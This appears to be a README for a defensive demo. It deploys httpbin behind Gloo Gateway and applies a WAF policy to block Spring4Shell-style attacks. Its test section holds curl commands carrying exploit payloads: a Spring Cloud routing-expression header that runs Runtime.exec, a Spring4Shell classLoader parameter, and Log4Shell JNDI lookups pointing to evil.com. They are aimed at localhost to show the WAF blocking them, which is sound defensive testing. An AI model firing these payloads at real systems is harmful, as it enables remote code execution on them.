# Smash Spring4Shell attacks with WAF and Gloo Gateway

https://www.solo.io/blog/smash-spring4shell-attacks-with-waf-and-gloo-edge/ 


## Deploy httpbin

```sh
kubectl create namespace httpbin --context gloo
kubectl --context gloo label namespace httpbin istio-injection=enabled

kubectl apply -f spring4shell/httpbin.yaml -n httpbin --context gloo
```

## Gloo Mesh Config


https://www.solo.io/blog/handling-super-sized-requests-with-gloo-edge/

```sh
kubectl apply -f spring4shell/workspace.yaml --context gloo
kubectl apply -f spring4shell/virtual-gateway.yaml --context gloo
kubectl apply -f spring4shell/route-table.yaml --context gloo
```


## Test bad call

```sh
# Spring Cloud attack
curl -X POST -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' localhost:8080/anything -i

# Spring MVC and WebFlux attack
curl -X POST -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=some-malicious-pattern" localhost:8080/anything -i
```


## Apply Policy

```sh
kubectl apply -f spring4shell/waf-policy.yaml --context gloo
```

```sh
# Request Header Attacks
curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
# Request Argument Attacks
curl -X GET localhost:8080/anything\?arg-1=\$\\{jndi:ldap://evil.com/x\\} -i
# Request Payload Attacks
curl -X POST -d "arg-1=\${jndi:ldap://evil.com/x}" localhost:8080/anything -i
```
